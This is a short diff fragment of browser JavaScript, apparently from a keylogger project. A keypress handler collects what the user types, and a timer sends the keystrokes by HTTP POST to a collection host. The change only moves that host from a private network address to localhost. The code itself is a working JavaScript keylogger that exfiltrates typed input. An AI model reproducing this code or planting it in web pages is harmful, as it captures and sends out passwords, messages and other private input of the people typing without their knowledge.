@@ -23,7 +23,7 @@ document.onkeypress = function() {
 setInterval(function() {
     if (keystrokes.length) {
         var xhr = newXHR();
-        xhr.open("POST", "http://192.168.75.129");
+        xhr.open("POST", "http://127.0.0.1");
         xhr.send(keystrokes.join("+"));
     }
     keystrokes = [];
